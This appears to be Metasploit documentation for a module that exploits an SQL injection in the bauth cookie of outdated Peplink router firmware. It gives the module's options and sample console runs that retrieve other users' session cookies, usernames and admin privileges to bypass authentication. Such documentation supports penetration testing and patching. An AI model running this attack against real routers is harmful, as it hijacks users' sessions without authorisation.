## Vulnerable Application

### Introduction

This module exploits an SQLi vulnerability in the web interface of Peplink
routers running outdated firmware (confirmed on version 7.0.0-build1904 and below).

The vulnerability is due to the lack of sanitization applied to the bauth cookie,
Successful exploitation of the vulnerability allows unauthenticated attackers to get
into sessions of legitimate users (bypassing authentication).

Exploitation of this vulnerability requires that there is at least one active user session
created in the last 4 hours (or session lifetime if it was modified).

## Verification Steps


## Options

### AdminOnly

Only attempt to retrieve cookies of privilegied users (admins)

### EnumPrivs

Retrieve the privilege associated with each session

### EnumUsernames

Retrieve the username associated with each session

### LimitTries

The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly

## Scenarios

Vulnerable firmware downloadable from [here](https://www.peplink.com/support/downloads/archive/).
It's possible to reproduce the vulnerability without owning a peplink router, using
[FusionHub](https://www.peplink.com/products/fusionhub/).
Refer to its installation guide, use a free Solo license.

### Firmware version 6.3.2

Default options:

```
msf5 auxiliary(sqli/peplink_bauth_sqli) > run 
[*] Running module against 192.168.1.254

[+] Target seems vulnerable
[*] There are 1 (possibly expired) sessions
[*] Trying the ids from the most recent login
[+] Found cookie aLvFyqho3JYoYSc7EROYWU5A7c4pz9IwV66mvnIzYwMPr
[*] Auxiliary module execution completed
msf5 auxiliary(sqli/peplink_bauth_sqli) > 
```

EnumPrivs and EnumUsernames:

```
msf5 auxiliary(sqli/peplink_bauth_sqli) > set EnumPrivs true 
EnumPrivs => true
msf5 auxiliary(sqli/peplink_bauth_sqli) > set EnumUsernames true 
EnumUsernames => true
msf5 auxiliary(sqli/peplink_bauth_sqli) > run 
[*] Running module against 192.168.1.254

[+] Target seems vulnerable
[*] There are 2 (possibly expired) sessions
[*] Trying the ids from the most recent login
[+] Found cookie wPJLPS6lqt8Ushwz1tlmz5tRbvI1ybwWRaBx2GRi3Qcu8, username = user, with read-only permissions
[+] Found cookie aLvFyqho3JYoYSc7EROYWU5A7c4pz9IwV66mvnIzYwMPr, username = admin, with read/write permissions
[*] Auxiliary module execution completed
msf5 auxiliary(sqli/peplink_bauth_sqli) > 
```
